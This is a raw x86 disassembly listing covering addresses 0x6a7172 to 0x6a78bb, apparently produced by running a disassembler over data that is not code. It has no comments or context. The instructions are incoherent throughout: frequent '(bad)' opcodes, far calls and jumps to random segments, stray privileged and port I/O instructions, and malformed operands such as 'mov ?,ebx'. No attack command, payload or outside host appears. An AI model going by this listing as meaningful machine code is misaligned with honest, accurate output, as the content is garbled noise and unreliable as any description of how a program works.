  6a7172:	call   0xe195:0x7114e6be
  6a7179:	jle    0x6a71e3
  6a717b:	cmp    al,BYTE PTR [edx]
  6a717d:	je     0x6a716b
  6a717f:	and    DWORD PTR [esi],eax
  6a7181:	sbb    al,0x8
  6a7183:	mov    DWORD PTR [esi+0x60],edi
  6a7186:	pop    edi
  6a7187:	add    DWORD PTR [edi+0x5],edx
  6a718a:	jae    0x6a7117
  6a718c:	(bad)  
  6a718d:	ss and al,0xdb
  6a7190:	cmp    edi,DWORD PTR [eax+0x37]
  6a7193:	adc    al,0xf7
  6a7195:	sub    al,0x71
  6a7197:	stos   BYTE PTR es:[edi],al
  6a7198:	hlt    
  6a7199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a719a:	stos   BYTE PTR es:[edi],al
  6a719b:	mov    cl,0xe2
  6a719d:	mov    dh,0x8f
  6a719f:	mul    BYTE PTR [ebp+0x6d]
  6a71a2:	mov    edx,DWORD PTR [ebx]
  6a71a4:	lea    esp,[esi-0x7222704b]
  6a71aa:	out    0x3f,eax
  6a71ac:	inc    ebx
  6a71ad:	stos   BYTE PTR es:[edi],al
  6a71ae:	stos   DWORD PTR es:[edi],eax
  6a71af:	mov    ?,ebx
  6a71b1:	push   edx
  6a71b2:	mov    esp,0x1a6e4863
  6a71b7:	xor    BYTE PTR [ecx],cl
  6a71b9:	sub    DWORD PTR [ebx-0x6435d97c],0xffffff88
  6a71c0:	pop    ss
  6a71c1:	push   cs
  6a71c2:	aas    
  6a71c3:	dec    esp
  6a71c4:	mov    esp,0xe51b4b0a
  6a71c9:	loop   0x6a716d
  6a71cb:	jbe    0x6a724c
  6a71cd:	loope  0x6a71d1
  6a71cf:	sub    ah,BYTE PTR [esi]
  6a71d1:	int3   
  6a71d2:	call   0x624a:0x91f926e4
  6a71d9:	or     ah,BYTE PTR [edx+0x6798cd57]
  6a71df:	sbb    ecx,ebx
  6a71e1:	repnz mov eax,0xfe729ea4
  6a71e7:	mov    ebx,0xccb681bb
  6a71ec:	sbb    BYTE PTR [ecx-0x78b04b4b],ch
  6a71f2:	cld    
  6a71f3:	iret   
  6a71f4:	adc    bh,BYTE PTR [esi-0x48f6a8a7]
  6a71fa:	fmul   st,st(0)
  6a71fc:	cwde   
  6a71fd:	jmp    FWORD PTR [ecx-0x66671908]
  6a7203:	sub    eax,0x9279cf04
  6a7208:	stos   BYTE PTR es:[edi],al
  6a7209:	(bad)  
  6a720a:	stc    
  6a720b:	xchg   ebx,eax
  6a720c:	scas   eax,DWORD PTR es:[edi]
  6a720d:	xchg   edi,eax
  6a720e:	mov    ds:0x8a0609f0,eax
  6a7213:	adc    al,ah
  6a7215:	call   0xcb549d68
  6a721a:	push   edi
  6a721b:	lock xchg DWORD PTR [edi+edx*2],eax
  6a721f:	stos   DWORD PTR es:[edi],eax
  6a7220:	add    ecx,DWORD PTR [edi+esi*8-0x5e]
  6a7224:	mov    eax,ecx
  6a7226:	ret    0x905d
  6a7229:	adc    BYTE PTR [ebx+0x652454c0],0xb0
  6a7230:	ss enter 0x118e,0x66
  6a7235:	(bad)  
  6a7236:	aad    0xe2
  6a7238:	leave  
  6a7239:	inc    ebp
  6a723a:	jne    0x6a7233
  6a723c:	sbb    eax,0x563f1d34
  6a7241:	or     al,0x9
  6a7243:	mov    ah,0x3d
  6a7245:	fadd   st(5),st
  6a7247:	enter  0xe5a6,0x84
  6a724b:	xchg   ebp,eax
  6a724c:	xor    al,0x3a
  6a724e:	push   0x75
  6a7250:	imul   edi,edi,0x522fbf32
  6a7256:	popa   
  6a7257:	cmp    al,0x75
  6a7259:	push   ebx
  6a725a:	xchg   DWORD PTR [ebx+ebp*2],eax
  6a725d:	adc    esi,ebx
  6a725f:	push   eax
  6a7260:	inc    esi
  6a7261:	jb     0x6a725b
  6a7263:	xchg   ebx,eax
  6a7264:	dec    ebx
  6a7265:	sub    eax,0x1e89182e
  6a726a:	mov    ebp,0xca86e89e
  6a726f:	scas   al,BYTE PTR es:[edi]
  6a7270:	inc    edi
  6a7271:	xchg   esp,esi
  6a7273:	mov    eax,0x7cdcc7c3
  6a7278:	cmc    
  6a7279:	inc    esp
  6a727a:	add    al,0x3d
  6a727c:	pop    ds
  6a727d:	fnsave [ecx-0x5]
  6a7280:	pop    ebp
  6a7281:	dec    edi
  6a7282:	fidivr WORD PTR [ebp-0x4f]
  6a7285:	ret    0x2995
  6a7288:	icebp  
  6a7289:	pop    eax
  6a728a:	pop    edi
  6a728b:	ret    
  6a728c:	push   0xaf9b57e8
  6a7291:	clc    
  6a7292:	outs   dx,DWORD PTR ds:[esi]
  6a7293:	das    
  6a7294:	jmp    0x4a6ac0ad
  6a7299:	pusha  
  6a729a:	loopne 0x6a72ec
  6a729c:	mov    dl,0xe0
  6a729e:	ret    0x8e67
  6a72a1:	and    ebp,0xffffffea
  6a72a4:	(bad)  
  6a72a5:	xor    al,0x62
  6a72a7:	xor    BYTE PTR [esi+0x2cafd581],0x27
  6a72ae:	call   0x6764d34c
  6a72b3:	inc    esp
  6a72b4:	xlat   BYTE PTR ds:[ebx]
  6a72b5:	and    dl,cl
  6a72b7:	repnz rol DWORD PTR [eax+esi*8+0x6],cl
  6a72bc:	fisttp QWORD PTR [edx+0x7b]
  6a72bf:	std    
  6a72c0:	in     eax,dx
  6a72c1:	dec    ebx
  6a72c2:	ficomp WORD PTR [ebx]
  6a72c4:	pusha  
  6a72c5:	popa   
  6a72c6:	xchg   edi,eax
  6a72c7:	inc    ecx
  6a72c8:	ins    DWORD PTR es:[edi],dx
  6a72c9:	imul   ebx,ebp,0x21
  6a72cc:	add    DWORD PTR [ecx],esp
  6a72ce:	inc    esp
  6a72cf:	xchg   esp,eax
  6a72d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a72d1:	rcl    bh,0x51
  6a72d4:	ja     0x6a72e1
  6a72d6:	loop   0x6a72b9
  6a72d8:	or     cl,dh
  6a72da:	xchg   ecx,eax
  6a72db:	shr    BYTE PTR [eax-0x1e],cl
  6a72de:	aam    0xc8
  6a72e0:	jmp    0x77d5:0xf75f5bc6
  6a72e7:	call   0x9b7c:0x1751905f
  6a72ee:	leave  
  6a72ef:	mov    dh,bl
  6a72f1:	dec    edx
  6a72f2:	pushf  
  6a72f3:	in     al,dx
  6a72f4:	xor    eax,esi
  6a72f6:	push   0x7c
  6a72f8:	aam    0x55
  6a72fa:	mov    bh,0x9d
  6a72fc:	call   0xd2a2:0x4c5a3cf6
  6a7303:	cwde   
  6a7304:	dec    esp
  6a7305:	cmp    esi,DWORD PTR [ebx+0x4f]
  6a7308:	iret   
  6a7309:	ficom  DWORD PTR [eax+0xfcd7309]
  6a730f:	inc    esi
  6a7310:	jmp    0x6a7298
  6a7312:	out    dx,al
  6a7313:	mov    ebp,0x589a2c23
  6a7318:	sbb    al,0x7b
  6a731a:	cmp    DWORD PTR [ebp-0x53],ecx
  6a731d:	shl    dh,1
  6a731f:	jecxz  0x6a72ca
  6a7321:	push   ebp
  6a7322:	add    ah,0x64
  6a7325:	mov    fs,WORD PTR ds:0x69960bde
  6a732b:	cwde   
  6a732c:	repz mov ah,BYTE PTR [esi+ebp*8+0x59d03af7]
  6a7334:	cmp    dh,BYTE PTR ds:0xb1e711a5
  6a733a:	inc    esi
  6a733b:	aad    0x66
  6a733d:	fild   DWORD PTR [esi-0x6d5f79b4]
  6a7343:	(bad)  [ebx]
  6a7345:	mov    ch,0x61
  6a7347:	aad    0x1a
  6a7349:	sbb    DWORD PTR gs:[ecx+0x70],ebx
  6a734d:	nop
  6a734e:	pop    edi
  6a734f:	lock push ds
  6a7351:	(bad)  
  6a7352:	xchg   ebp,eax
  6a7353:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a7355:	sti    
  6a7356:	int3   
  6a7357:	xor    al,0x90
  6a7359:	(bad)  [ecx+0x2e9ec005]
  6a735f:	add    DWORD PTR [ebx-0x67],ecx
  6a7362:	or     DWORD PTR [esi],0x8c657029
  6a7368:	cmp    ebp,DWORD PTR [edx+0x24]
  6a736b:	xchg   esi,eax
  6a736c:	jle    0x6a72fc
  6a736e:	adc    ecx,ebx
  6a7370:	adc    eax,0x72a11317
  6a7375:	leave  
  6a7376:	enter  0x877f,0x80
  6a737a:	in     al,dx
  6a737b:	and    eax,0xb6871be6
  6a7380:	add    al,0x78
  6a7382:	xchg   ebx,eax
  6a7383:	stos   BYTE PTR es:[edi],al
  6a7384:	mov    cl,BYTE PTR [ebx-0x18]
  6a7387:	add    cl,BYTE PTR [ebx+0x4]
  6a738a:	rol    esi,0x28
  6a738d:	lods   al,BYTE PTR ds:[esi]
  6a738e:	jp     0x6a73a8
  6a7390:	pop    esp
  6a7391:	js     0x6a7388
  6a7393:	imul   edx,DWORD PTR [edi+edi*8-0x7e],0x2a
  6a7398:	retf   
  6a7399:	pop    ds
  6a739a:	ror    BYTE PTR ds:0x125c207b,0x6c
  6a73a1:	mov    esp,DWORD PTR [esi+0xd]
  6a73a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a73a5:	arpl   WORD PTR [ebx+0x41],cx
  6a73a8:	in     eax,dx
  6a73a9:	push   esp
  6a73aa:	mov    edx,esi
  6a73ac:	retf   
  6a73ad:	and    DWORD PTR [edi+0x1d4e836b],0x59
  6a73b4:	xor    BYTE PTR [ebp+0x77],dh
  6a73b7:	mov    WORD PTR [eax],ds
  6a73b9:	or     al,BYTE PTR [ecx+0x48]
  6a73bc:	xor    eax,DWORD PTR [edi]
  6a73be:	ret    0xce8b
  6a73c1:	jp     0x6a7351
  6a73c3:	mov    ebx,0x76875ad4
  6a73c8:	das    
  6a73c9:	push   0x15
  6a73cb:	add    BYTE PTR [eax],bh
  6a73cd:	dec    eax
  6a73ce:	call   0xb05c:0x389cc75b
  6a73d5:	call   0x5daea823
  6a73da:	xchg   esi,eax
  6a73db:	aas    
  6a73dc:	sbb    al,0xe0
  6a73de:	dec    esp
  6a73df:	pop    edx
  6a73e0:	(bad)  
  6a73e1:	adc    edx,DWORD PTR [edx+edx*8+0x49]
  6a73e5:	push   0xffffffa1
  6a73e7:	fsub   QWORD PTR [ecx-0x4ea314c3]
  6a73ed:	adc    edx,DWORD PTR [esi+0x5d]
  6a73f0:	iret   
  6a73f1:	aad    0x20
  6a73f3:	pop    esp
  6a73f4:	mov    ecx,0x3194f5bd
  6a73f9:	pop    ss
  6a73fa:	les    esp,FWORD PTR [ecx+ecx*4-0x4f]
  6a73fe:	adc    eax,DWORD PTR [ebx+0x689b91a0]
  6a7404:	ret    0xa9bb
  6a7407:	push   esp
  6a7408:	jecxz  0x6a73ea
  6a740a:	retf   0xfbf5
  6a740d:	pusha  
  6a740e:	dec    esp
  6a740f:	jmp    ecx
  6a7411:	add    dl,dl
  6a7413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a7414:	jmp    0xa63b:0x27a9aa98
  6a741b:	nop
  6a741c:	pusha  
  6a741d:	and    BYTE PTR [ebx-0x33],bl
  6a7420:	cwde   
  6a7421:	sar    ebx,1
  6a7423:	sub    eax,0x4965950c
  6a7428:	add    esp,DWORD PTR [eax]
  6a742a:	and    eax,0x3c3b1670
  6a742f:	ins    DWORD PTR es:[edi],dx
  6a7430:	cmc    
  6a7431:	(bad)  
  6a7432:	in     al,dx
  6a7433:	mov    edi,eax
  6a7435:	ret    0xe8f3
  6a7438:	and    ebp,esi
  6a743a:	and    al,0xf5
  6a743c:	mov    BYTE PTR [eax-0x4c],bl
  6a743f:	jae    0x6a742f
  6a7441:	sbb    bl,cl
  6a7443:	(bad)  
  6a7444:	fyl2x  
  6a7446:	push   esi
  6a7447:	adc    DWORD PTR [ebp-0x1fb12d5f],0x54
  6a744e:	es scas al,BYTE PTR es:[edi]
  6a7450:	cld    
  6a7451:	cmp    BYTE PTR [eax-0x1c],dl
  6a7454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a7455:	mov    bh,cl
  6a7457:	inc    ebx
  6a7458:	rcr    DWORD PTR [ecx+0x33],cl
  6a745b:	sbb    BYTE PTR [esi+ebp*8],al
  6a745e:	out    dx,eax
  6a745f:	and    ah,cl
  6a7461:	xchg   edx,eax
  6a7462:	retf   
  6a7463:	inc    ebx
  6a7464:	aad    0xdd
  6a7466:	lock in eax,dx
  6a7468:	mov    al,0x3c
  6a746a:	ins    BYTE PTR es:[edi],dx
  6a746b:	sbb    edx,DWORD PTR [esi-0x60]
  6a746e:	stos   BYTE PTR es:[edi],al
  6a746f:	popa   
  6a7470:	mov    dl,0x2c
  6a7472:	inc    ebx
  6a7473:	je     0x6a7446
  6a7475:	sub    BYTE PTR [edx+0x1fa2b3da],dh
  6a747b:	test   al,0x62
  6a747d:	(bad)  
  6a747e:	pop    ebx
  6a747f:	fadd   QWORD PTR [ebp-0x7b174f81]
  6a7485:	mov    ebx,0x5d5fc3c2
  6a748a:	(bad)  
  6a748b:	mov    esi,0xe4057a46
  6a7490:	imul   esi,DWORD PTR [ecx],0x6e
  6a7493:	cld    
  6a7494:	adc    al,0x1d
  6a7496:	cwde   
  6a7497:	dec    esi
  6a7498:	shr    bl,1
  6a749a:	outs   dx,DWORD PTR ds:[esi]
  6a749b:	jno    0x6a7462
  6a749d:	int3   
  6a749e:	repz icebp 
  6a74a0:	rcl    dh,0xfd
  6a74a3:	mov    al,0x22
  6a74a5:	inc    ebp
  6a74a6:	mov    ecx,ebx
  6a74a8:	and    DWORD PTR [edx+0x12],0x72a99df3
  6a74af:	mov    al,ds:0xe8ab5446
  6a74b4:	dec    edi
  6a74b5:	mov    edx,DWORD PTR [ecx+0x4d6160d7]
  6a74bb:	cmp    dl,dl
  6a74bd:	and    eax,0x37fcb2b3
  6a74c2:	je     0x6a74ce
  6a74c4:	scas   al,BYTE PTR es:[edi]
  6a74c5:	retf   0xaf39
  6a74c8:	fnstsw WORD PTR [ecx]
  6a74ca:	rsqrtps xmm5,XMMWORD PTR [edi+0x2a]
  6a74ce:	xor    eax,0xd182ed01
  6a74d3:	call   0x57624579
  6a74d8:	pop    ecx
  6a74d9:	jmp    0x6a7555
  6a74db:	repnz dec esp
  6a74dd:	icebp  
  6a74de:	jo     0x6a74d5
  6a74e0:	(bad)  
  6a74e1:	pop    ecx
  6a74e2:	dec    ebp
  6a74e3:	or     edx,eax
  6a74e5:	cmp    al,0x12
  6a74e7:	mov    DWORD PTR [edi+0x7],esp
  6a74ea:	ins    DWORD PTR es:[edi],dx
  6a74eb:	test   BYTE PTR [edi],cl
  6a74ed:	jnp    0x6a74ef
  6a74ef:	hlt    
  6a74f0:	or     dh,BYTE PTR [ecx+0x28]
  6a74f3:	scas   al,BYTE PTR es:[edi]
  6a74f4:	and    esp,eax
  6a74f6:	loopne 0x6a74f7
  6a74f8:	out    0x65,al
  6a74fa:	xchg   ebp,eax
  6a74fb:	mov    eax,ds:0x5f3e194b
  6a7500:	clc    
  6a7501:	iret   
  6a7502:	xchg   esp,eax
  6a7503:	and    al,0x7b
  6a7505:	out    0x22,eax
  6a7507:	or     BYTE PTR [ecx],0x28
  6a750a:	ins    BYTE PTR es:[edi],dx
  6a750b:	add    BYTE PTR [edi],0x9c
  6a750e:	jmp    0x6a7520
  6a7510:	xor    DWORD PTR [esp+eax*4+0x1],edx
  6a7514:	cs xchg ebp,ecx
  6a7517:	or     al,0xcd
  6a7519:	mov    al,ds:0x7c872fb5
  6a751e:	add    eax,0x10900cf9
  6a7523:	sbb    eax,0x313ffeb1
  6a7528:	retf   0x1ae
  6a752b:	add    BYTE PTR [ebx+ecx*2-0x166a91af],bh
  6a7532:	call   FWORD PTR [ecx-0x329eb528]
  6a7538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a7539:	test   DWORD PTR [edi+eiz*1+0x14],ebp
  6a753d:	inc    eax
  6a753e:	adc    dh,bl
  6a7540:	sti    
  6a7541:	test   BYTE PTR [ebx*4-0x3451caec],0xf9
  6a7549:	stos   BYTE PTR es:[edi],al
  6a754a:	ss jne 0x6a74ea
  6a754d:	rcr    cl,1
  6a754f:	outs   dx,BYTE PTR ds:[esi]
  6a7550:	and    dl,BYTE PTR [ecx+0x5a]
  6a7553:	sbb    ebx,ebx
  6a7555:	ds xchg ecx,eax
  6a7557:	mov    ds:0xfb485816,eax
  6a755c:	retf   0x427e
  6a755f:	ds retf 
  6a7561:	fisttp DWORD PTR [ebx-0x4e4b7921]
  6a7567:	sub    ecx,DWORD PTR [ebx-0x764804f5]
  6a756d:	mov    edx,0x3bcf1620
  6a7572:	lods   eax,DWORD PTR ds:[esi]
  6a7573:	stc    
  6a7574:	adc    dl,ah
  6a7576:	cld    
  6a7577:	call   0x9970:0x7ccbbc98
  6a757e:	add    esp,ebx
  6a7580:	jmp    0x66502cb9
  6a7585:	xchg   edi,eax
  6a7586:	(bad)  [ecx]
  6a7588:	stc    
  6a7589:	push   ebx
  6a758a:	jno    0x6a750f
  6a758c:	or     ebp,DWORD PTR [edi-0x5a430ad0]
  6a7592:	imul   eax,DWORD PTR [esp+edi*1-0x6ea68781],0x4e5513fe
  6a759d:	ss push ds
  6a759f:	jnp    0x6a75a3
  6a75a1:	inc    edx
  6a75a2:	or     esi,ebp
  6a75a4:	pop    ecx
  6a75a5:	int3   
  6a75a6:	pop    ebx
  6a75a7:	add    ch,ch
  6a75a9:	retf   
  6a75aa:	mov    bh,0x6
  6a75ac:	xlat   BYTE PTR ds:[ebx]
  6a75ad:	pslld  mm1,mm7
  6a75b0:	sbb    esi,DWORD PTR [edi+0x77]
  6a75b3:	outs   dx,BYTE PTR ds:[esi]
  6a75b4:	dec    edx
  6a75b5:	out    dx,al
  6a75b6:	mov    BYTE PTR [esi-0x38],cl
  6a75b9:	or     ebx,DWORD PTR ds:0x57d621eb
  6a75bf:	leave  
  6a75c0:	scas   al,BYTE PTR es:[edi]
  6a75c1:	sar    DWORD PTR [esp+edi*8],cl
  6a75c4:	sub    al,0x34
  6a75c6:	lds    ebp,FWORD PTR [ebp-0x34c96265]
  6a75cc:	sub    BYTE PTR [ebp-0x7e],cl
  6a75cf:	xchg   ecx,eax
  6a75d0:	cmc    
  6a75d1:	jbe    0x6a7582
  6a75d3:	ja     0x6a762e
  6a75d5:	mov    bl,0xcb
  6a75d7:	or     eax,0xfa2e0ee7
  6a75dc:	jo     0x6a75ee
  6a75de:	in     eax,dx
  6a75df:	fmul   QWORD PTR [edi+0x26]
  6a75e2:	pop    es
  6a75e3:	test   eax,0x23f01c7e
  6a75e8:	das    
  6a75e9:	mov    ch,0xdc
  6a75eb:	jns    0x6a75b4
  6a75ed:	jge    0x6a75e4
  6a75ef:	sub    ah,BYTE PTR [edx+0x6bbdb956]
  6a75f5:	pop    ebx
  6a75f6:	inc    eax
  6a75f7:	imul   ecx,DWORD PTR [edx-0x1e],0x49
  6a75fb:	adc    esp,DWORD PTR [eax+0x4014d893]
  6a7601:	ret    
  6a7602:	xor    BYTE PTR [esp+edi*4+0x3e13ec9],0x3b
  6a760a:	xchg   BYTE PTR [eax-0x77775051],bh
  6a7610:	mov    esi,0x403b2bf0
  6a7615:	retf   
  6a7616:	ror    DWORD PTR [ebx+0x651b04ea],1
  6a761c:	mov    bh,0x32
  6a761e:	repnz jecxz 0x6a7646
  6a7621:	mov    gs:0x2f0b85b7,eax
  6a7627:	call   DWORD PTR [eax-0x345d248f]
  6a762d:	shl    BYTE PTR [esi+0x55115901],0x98
  6a7634:	in     eax,0xf7
  6a7636:	lds    ebx,FWORD PTR [esi+0x19]
  6a7639:	pop    ebp
  6a763a:	in     al,0x94
  6a763c:	xor    al,BYTE PTR [edi]
  6a763e:	sbb    DWORD PTR [eax+eax*2-0x7a],edx
  6a7642:	xor    BYTE PTR ds:0x76b33fca,bh
  6a7648:	inc    edx
  6a7649:	int3   
  6a764a:	dec    ecx
  6a764b:	mov    edx,DWORD PTR [eax+0x7e]
  6a764e:	dec    eax
  6a764f:	fmul   DWORD PTR [esp+esi*2+0x1534409a]
  6a7656:	mov    eax,DWORD PTR [eax]
  6a7658:	cld    
  6a7659:	or     al,0xa1
  6a765b:	mov    al,ds:0x15390ce
  6a7660:	(bad)  
  6a7661:	outs   dx,BYTE PTR ds:[esi]
  6a7662:	pop    ebp
  6a7663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a7664:	sub    DWORD PTR [ecx],ebx
  6a7666:	push   0x40
  6a7668:	repnz mov ebx,0x29844175
  6a766e:	adc    dl,bl
  6a7670:	fcom   DWORD PTR [edx]
  6a7672:	jno    0x6a7605
  6a7674:	lds    edx,FWORD PTR [ecx-0x6062d083]
  6a767a:	repnz (bad) 
  6a767c:	std    
  6a767d:	div    edx
  6a767f:	lds    edx,FWORD PTR [esp+edi*4-0x3e78c3b1]
  6a7686:	cld    
  6a7687:	inc    eax
  6a7688:	ins    BYTE PTR es:[edi],dx
  6a7689:	ins    DWORD PTR es:[edi],dx
  6a768a:	fdiv   st(5),st
  6a768c:	popa   
  6a768d:	mov    bh,0x2
  6a768f:	fstp   QWORD PTR [ecx-0xafcbada]
  6a7695:	push   ebx
  6a7696:	xchg   edi,eax
  6a7697:	or     BYTE PTR [eax+0x29],cl
  6a769a:	pop    ecx
  6a769b:	mov    DWORD PTR [edx-0x25ba7bd2],ebp
  6a76a1:	jns    0x6a7641
  6a76a3:	push   ebp
  6a76a4:	adc    esp,DWORD PTR [ebx+0x579a025f]
  6a76aa:	jns    0x6a770d
  6a76ac:	(bad)  
  6a76ad:	mov    bh,0xfb
  6a76af:	pop    es
  6a76b0:	mov    esp,0x234f1759
  6a76b5:	les    eax,FWORD PTR [edi+0x58ba914e]
  6a76bb:	push   ebx
  6a76bc:	xchg   esp,eax
  6a76bd:	ficom  DWORD PTR [edi-0x5e]
  6a76c0:	shl    BYTE PTR [edx+0x6d],0xa6
  6a76c4:	push   ebp
  6a76c5:	bound  edi,QWORD PTR [edi+edi*8-0x20]
  6a76c9:	mov    ?,WORD PTR [edx-0x16e8e69b]
  6a76cf:	xchg   ecx,eax
  6a76d0:	dec    ebx
  6a76d1:	stos   DWORD PTR es:[edi],eax
  6a76d2:	add    dl,BYTE PTR [esi-0x1d4edfd]
  6a76d8:	xor    edx,edi
  6a76da:	push   DWORD PTR [ecx-0x247d6e50]
  6a76e0:	rcr    DWORD PTR [ecx+0x66154e95],1
  6a76e6:	and    DWORD PTR [edi+0x6b9a62f8],0xffffffce
  6a76ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a76ee:	sbb    eax,0x8bc95ddb
  6a76f3:	cmp    eax,DWORD PTR [ebx-0x41]
  6a76f6:	rcl    BYTE PTR [esi-0x4b043874],cl
  6a76fc:	push   cs
  6a76fd:	retf   
  6a76fe:	mov    esp,0x716a481a
  6a7703:	stos   BYTE PTR es:[edi],al
  6a7704:	addr16 sub eax,0x18d018b2
  6a770a:	add    al,0x9b
  6a770c:	call   0xd110:0xe5c92a03
  6a7713:	sub    bl,BYTE PTR [edx+0x6fd3067a]
  6a7719:	in     eax,0xba
  6a771b:	out    0x2d,eax
  6a771d:	(bad)  
  6a771e:	jnp    0x6a7719
  6a7720:	ret    
  6a7721:	push   0xffffffb2
  6a7723:	pop    esp
  6a7724:	mov    edi,ds
  6a7726:	mov    DWORD PTR [edi+0x52],ecx
  6a7729:	into   
  6a772a:	scas   al,BYTE PTR es:[edi]
  6a772b:	xor    bh,BYTE PTR [edx+0x6]
  6a772e:	xor    al,0xd7
  6a7730:	jge    0x6a76ca
  6a7732:	dec    edx
  6a7733:	xchg   edi,eax
  6a7734:	xor    DWORD PTR [edx-0x4cafa02e],ebx
  6a773a:	mov    ebx,DWORD PTR [ebx-0x36]
  6a773d:	push   0xa2166754
  6a7742:	das    
  6a7743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a7744:	ror    dh,0x77
  6a7747:	in     al,0xd1
  6a7749:	das    
  6a774a:	imul   esp,DWORD PTR [esi+0x35],0x4b
  6a774e:	hlt    
  6a774f:	retf   0x443d
  6a7752:	js     0x6a778a
  6a7754:	mov    dl,BYTE PTR ds:0x4d391beb
  6a775a:	mov    eax,DWORD PTR [ecx+0x3486805e]
  6a7760:	sbb    BYTE PTR ds:0x2e8adca,bh
  6a7766:	or     dh,bl
  6a7768:	dec    esp
  6a7769:	ja     0x6a7795
  6a776b:	sub    eax,0xf666203e
  6a7770:	pusha  
  6a7771:	inc    ecx
  6a7772:	push   es
  6a7773:	adc    dh,BYTE PTR [edi+eiz*8+0x3f9dd3c5]
  6a777a:	fsubp  st(2),st
  6a777c:	ret    0x92ed
  6a777f:	jb     0x6a7736
  6a7781:	cmp    DWORD PTR [ebp-0x6c539d14],ebx
  6a7787:	ret    0x707b
  6a778a:	sbb    ch,BYTE PTR [ecx-0x6c3043b7]
  6a7790:	push   ds
  6a7791:	inc    ecx
  6a7792:	iret   
  6a7793:	mov    BYTE PTR [esi-0x4],0x3f
  6a7797:	stos   DWORD PTR es:[edi],eax
  6a7798:	int    0xb4
  6a779a:	out    0xd6,al
  6a779c:	das    
  6a779d:	mov    ah,0xab
  6a779f:	pop    ss
  6a77a0:	xchg   esp,eax
  6a77a1:	xchg   BYTE PTR [ebp+0x1ea70b47],cl
  6a77a7:	lahf   
  6a77a8:	push   eax
  6a77a9:	cli    
  6a77aa:	xor    edi,DWORD PTR [edx+0x62d0f9b3]
  6a77b0:	jl     0x6a774c
  6a77b2:	retf   0x5c80
  6a77b5:	(bad)  
  6a77b8:	xor    edx,DWORD PTR [edx+0x22370ce]
  6a77be:	rcl    BYTE PTR [eax],0xd9
  6a77c1:	lahf   
  6a77c2:	arpl   WORD PTR [ebx+0x43],cx
  6a77c5:	xchg   ebp,eax
  6a77c6:	cdq    
  6a77c7:	adc    al,BYTE PTR [edx-0x25]
  6a77ca:	fiadd  DWORD PTR [ebx-0x27d7c5c1]
  6a77d0:	jne    0x6a77ee
  6a77d2:	jge    0x6a7827
  6a77d4:	ins    DWORD PTR es:[edi],dx
  6a77d5:	adc    eax,ecx
  6a77d7:	xchg   ebx,eax
  6a77d8:	xchg   ebx,eax
  6a77d9:	lds    esp,FWORD PTR ds:0xff47b95d
  6a77df:	test   BYTE PTR [edx],0x35
  6a77e2:	ficom  WORD PTR [esi]
  6a77e4:	jo     0x6a778f
  6a77e6:	mov    bl,0xcb
  6a77e8:	sahf   
  6a77e9:	ja     0x6a77b7
  6a77eb:	(bad)  
  6a77ec:	mov    ch,0x28
  6a77ee:	imul   esp,DWORD PTR [eax],0x204338ca
  6a77f4:	xchg   ebx,eax
  6a77f5:	inc    eax
  6a77f6:	mov    ebp,0x247e4ff
  6a77fb:	inc    edi
  6a77fc:	loop   0x6a77f1
  6a77fe:	xchg   edi,eax
  6a77ff:	xlat   BYTE PTR ds:[ebx]
  6a7800:	jecxz  0x6a7860
  6a7802:	and    edx,esp
  6a7804:	jb     0x6a7885
  6a7806:	inc    edi
  6a7807:	push   ss
  6a7808:	dec    esi
  6a7809:	dec    edx
  6a780a:	mov    BYTE PTR ds:0x602e796d,ah
  6a7810:	fist   DWORD PTR [ebx+0x5b]
  6a7813:	push   eax
  6a7814:	mov    edx,0x263c0020
  6a7819:	test   eax,0x6e9ecebe
  6a781e:	dec    esi
  6a781f:	test   eax,0xb70fe50c
  6a7824:	and    esp,esp
  6a7826:	ror    DWORD PTR [eax],1
  6a7828:	mov    al,bl
  6a782a:	cmp    edx,DWORD PTR [ebx-0x16]
  6a782d:	add    edx,DWORD PTR [ecx+eiz*1-0x4f]
  6a7831:	es retf 
  6a7833:	sbb    edi,DWORD PTR [ecx-0x6cb20d4e]
  6a7839:	dec    eax
  6a783a:	(bad)  
  6a783b:	cwde   
  6a783c:	aad    0x23
  6a783e:	addr16 lahf 
  6a7840:	xchg   esp,eax
  6a7841:	dec    edx
  6a7842:	jle    0x6a7882
  6a7844:	popf   
  6a7845:	enter  0xc938,0x75
  6a7849:	sub    eax,0x1fdaf722
  6a784e:	inc    ebp
  6a784f:	adc    al,bh
  6a7851:	mov    ecx,0x8f239fcb
  6a7856:	adc    BYTE PTR [esi-0x70],bl
  6a7859:	dec    eax
  6a785a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a785b:	es jp  0x6a77fe
  6a785e:	cmp    DWORD PTR [edi+0x8a47c3d],0xfffffff5
  6a7865:	pop    ds
  6a7866:	bound  ebp,QWORD PTR [eax]
  6a7868:	retf   0xfe7
  6a786b:	xor    al,cl
  6a786d:	mov    BYTE PTR [ecx+ebx*8],bh
  6a7870:	rcr    dh,cl
  6a7872:	or     DWORD PTR [ebp+0x79e39e52],0xaa1acbe0
  6a787c:	cli    
  6a787d:	pop    ecx
  6a787e:	fnsave [edx]
  6a7880:	jecxz  0x6a7846
  6a7882:	mov    cs,WORD PTR [ebp-0x1a2714d7]
  6a7888:	cs hlt 
  6a788a:	sub    dl,dh
  6a788c:	push   ebp
  6a788d:	jno    0x6a7890
  6a788f:	sbb    eax,DWORD PTR [ecx+0x32]
  6a7892:	push   ebp
  6a7893:	mov    esp,0xdb9f54cb
  6a7898:	adc    eax,0x636b1f24
  6a789d:	jne    0x6a78c9
  6a789f:	pusha  
  6a78a0:	fs jo  0x6a78b0
  6a78a3:	mov    DWORD PTR [ebp-0x7e4d3650],esi
  6a78a9:	jne    0x6a78f8
  6a78ab:	xchg   DWORD PTR [ebp+ebp*1-0x4e360fe8],esp
  6a78b2:	in     al,dx
  6a78b3:	push   0xffffff89
  6a78b5:	add    al,0x15
  6a78b7:	(bad)  
  6a78b9:	icebp  
  6a78ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a78bb:	loop   0x6a790b
